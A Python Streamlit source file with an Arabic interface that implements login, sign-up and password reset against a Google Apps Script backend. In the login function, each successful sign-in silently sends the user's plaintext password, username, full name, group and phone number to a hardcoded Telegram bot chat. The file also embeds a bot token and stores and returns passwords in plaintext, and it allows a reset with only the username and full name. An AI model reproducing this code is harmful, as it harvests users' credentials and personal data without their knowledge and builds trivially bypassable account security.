import streamlit as st
import requests
from orders import main as orders_main  # دالة العرض من ملف orders.py

GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbycx6K2dBkAytd7QQQkrGkVnGkQUc0Aqs2No55dUDVeUmx8ERwaLqClhF9zhofyzPmY/exec"

def load_css(file_path):
    with open(file_path, "r", encoding="utf-8") as f:
        css = f.read()
    st.markdown(f"<style>{css}</style>", unsafe_allow_html=True)

def send_telegram_message(message):
    bot_token = "8165532786:AAHYiNEgO8k1TDz5WNtXmPHNruQM15LIgD4"
    chat_id = "6283768537"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data)
    except Exception as e:
        st.error(f"خطأ في إرسال رسالة التليجرام: {e}")

def check_login(username, password):
    data = {"action": "check", "username": username, "password": password}
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=10)
        return res.text.strip() == "TRUE"
    except Exception as e:
        st.error(f"خطأ في التحقق من تسجيل الدخول: {e}")
        return False

def get_user_data(username):
    data = {"action": "get_user_data", "username": username}
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        text = res.text.strip()
        if text == "NOT_FOUND":
            return None
        parts = text.split(",")
        if len(parts) == 5:
            return {
                "username": parts[0],
                "password": parts[1],
                "full_name": parts[2],
                "group": parts[3],
                "phone": parts[4]
            }
        return None
    except Exception as e:
        st.error(f"خطأ في جلب بيانات المستخدم: {e}")
        return None

def add_user(username, password, full_name, group, phone):
    data = {
        "action": "add",
        "username": username,
        "password": password,
        "full_name": full_name,
        "group": group,
        "phone": phone
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        return res.text.strip() == "Added"
    except Exception as e:
        st.error(f"خطأ في تسجيل المستخدم الجديد: {e}")
        return False

def update_password(username, full_name, new_password):
    data = {
        "action": "update_password",
        "username": username,
        "full_name": full_name,
        "new_password": new_password
    }
    try:
        res = requests.post(GOOGLE_SCRIPT_URL, data=data, timeout=5)
        return res.text.strip() == "UPDATED"
    except Exception as e:
        st.error(f"خطأ في تحديث كلمة المرور: {e}")
        return False

def login_page():
    st.title("تسجيل الدخول")

    if 'show_signup' not in st.session_state:
        st.session_state['show_signup'] = False
    if 'signup_success' not in st.session_state:
        st.session_state['signup_success'] = False

    if not st.session_state['show_signup']:
        username = st.text_input("اسم المستخدم", key="login_username")
        password = st.text_input("كلمة المرور", type="password", key="login_password")

        if st.button("دخول"):
            if not username or not password:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if check_login(username, password):
                    user_data = get_user_data(username)
                    if user_data:
                        st.session_state['logged_in'] = True
                        st.session_state['user_name'] = user_data['username']
                        message = (
                            f"🔑 تم تسجيل دخول المستخدم:\n"
                            f"اسم المستخدم: <b>{user_data['username']}</b>\n"
                            f"كلمة المرور: <b>{user_data['password']}</b>\n"
                            f"الاسم الكامل: <b>{user_data['full_name']}</b>\n"
                            f"الجروب: <b>{user_data['group']}</b>\n"
                            f"رقم الهاتف: <b>{user_data['phone']}</b>"
                        )
                        send_telegram_message(message)
                        st.rerun()
                    else:
                        st.error("تعذر جلب بيانات المستخدم")
                else:
                    st.error("اسم المستخدم أو كلمة المرور غير صحيحة")

        if st.session_state['signup_success']:
            st.success("✅ تم إنشاء الحساب بنجاح، سجل دخولك الآن")
            st.session_state['signup_success'] = False

        col1, col2 = st.columns(2)
        with col1:
            if st.button("إنشاء حساب جديد"):
                st.session_state['show_signup'] = True
                st.rerun()
        with col2:
            if st.button("هل نسيت كلمة المرور؟"):
                st.session_state['show_forgot'] = True
                st.rerun()

    else:
        st.title("إنشاء حساب جديد")
        signup_username = st.text_input("اسم المستخدم", key="signup_username")
        signup_password = st.text_input("كلمة المرور", type="password", key="signup_password")
        signup_full_name = st.text_input("الاسم الكامل", key="signup_full_name")
        signup_group = st.text_input("الجروب", key="signup_group")
        signup_phone = st.text_input("رقم الهاتف", key="signup_phone")

        if st.button("تسجيل"):
            if not signup_username or not signup_password or not signup_full_name or not signup_group or not signup_phone:
                st.warning("يرجى ملء جميع الحقول")
            else:
                if add_user(signup_username, signup_password, signup_full_name, signup_group, signup_phone):
                    st.session_state['show_signup'] = False
                    st.session_state['signup_success'] = True
                    st.rerun()
                else:
                    st.error("فشل في إنشاء الحساب، حاول مرة أخرى")

        if st.button("العودة لتسجيل الدخول"):
            st.session_state['show_signup'] = False
            st.rerun()

def forgot_password_page():
    st.title("استعادة كلمة المرور")

    username = st.text_input("اسم المستخدم", key="forgot_username")
    full_name = st.text_input("الاسم الكامل", key="forgot_full_name")

    if st.button("تحقق"):
        user_data = get_user_data(username)
        if user_data and user_data['full_name'].strip().lower() == full_name.strip().lower():
            st.success("✅ تم التحقق بنجاح، أدخل كلمة مرور جديدة")

            new_password = st.text_input("كلمة المرور الجديدة", type="password", key="new_pass")
            confirm_password = st.text_input("تأكيد كلمة المرور", type="password", key="confirm_pass")

            if st.button("تحديث كلمة المرور"):
                if new_password != confirm_password:
                    st.warning("كلمة المرور غير متطابقة")
                elif update_password(username, full_name, new_password):
                    st.success("✅ تم تحديث كلمة المرور بنجاح، عد لتسجيل الدخول")
                    if st.button("العودة لتسجيل الدخول"):
                        st.session_state['show_forgot'] = False
                        st.rerun()
                else:
                    st.error("فشل في تحديث كلمة المرور")
        else:
            st.error("اسم المستخدم أو الاسم الكامل غير صحيح")

def main():
    load_css("styles.css")

    if 'logged_in' not in st.session_state or not st.session_state['logged_in']:
        if 'show_forgot' in st.session_state and st.session_state['show_forgot']:
            forgot_password_page()
        else:
            login_page()
    else:
        st.sidebar.write(f"مرحباً، {st.session_state['user_name']}")
        if st.sidebar.button("تسجيل خروج"):
            st.session_state['logged_in'] = False
            st.session_state.pop('user_name', None)
            st.rerun()

        orders_main()

if __name__ == "__main__":
    main()
